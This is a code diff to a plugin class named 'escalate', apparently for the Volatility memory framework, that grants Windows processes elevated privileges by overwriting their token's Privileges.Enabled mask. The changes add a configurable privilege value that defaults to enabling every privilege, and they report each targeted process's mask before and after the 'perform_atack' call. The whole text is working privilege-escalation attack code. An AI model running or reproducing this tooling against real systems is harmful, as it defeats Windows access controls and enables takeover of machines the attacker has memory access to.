@@ -38,6 +38,9 @@ class escalate(common.AbstractWindowsCommand):
         self._config.add_option('NAME', short_option='n', type='string', default=None,
             help='Name of Process to Escalate, multiple names can be separated with commas', action='store')
 
+        self._config.add_option('PRIV', short_option='p', type='string', default='FFFFFFFFFFFFFFFF',
+            help='level to escalate privilege to', action='store')
+
         self._config.add_option('ALL', short_option='a', action="store_true",
             help="Escalate all Processes", default=False)
 
@@ -76,7 +79,7 @@ class escalate(common.AbstractWindowsCommand):
         :return: Nothing
         '''
         for proc in self._proc:
-            proc.get_token().Privileges.Enabled = 0xFFFFFFFFFFFFFFFF
+            proc.get_token().Privileges.Enabled = self.PRIV
 
 
     def get_pid_from_name(self, name):
@@ -107,6 +110,7 @@ class escalate(common.AbstractWindowsCommand):
 
     def render_text(self, outfd, data):
         self._addrspace = utils.load_as(self._config)
+        self.PRIV = int(self._config.PRIV, 16)
 
         if not self._config.ALL:
             pid = self._config.PID.split(",") if self._config.PID is not None else [None]
@@ -127,8 +131,12 @@ class escalate(common.AbstractWindowsCommand):
 
         self._proc = [self.get_target_proc(p) for p in pid]
 
+        old_priv = [int(proc.get_token().Privileges.Enabled) for proc in self._proc]
+
         self.perform_atack()
 
-        outfd.write("{:20} {:10} {:35}\n".format("Name", "PID", "Result"))
-        for n, p in zip(name, pid):
-            outfd.write("{:20} {:10} {:35}\n".format(n, str(p), "Privileges Escalated Successfully"))
+        new_priv = [proc.get_token().Privileges.Enabled for proc in self._proc]
+
+        outfd.write("{:20} {:10} {:20} {:20}\n".format("Name", "PID", "Before", "After"))
+        for n, p, old_p, new_p in zip(name, pid, old_priv, new_priv):
+            outfd.write("{:20} {:10} {:20} {:20}\n".format(n, str(p), hex(old_p), hex(new_p)))
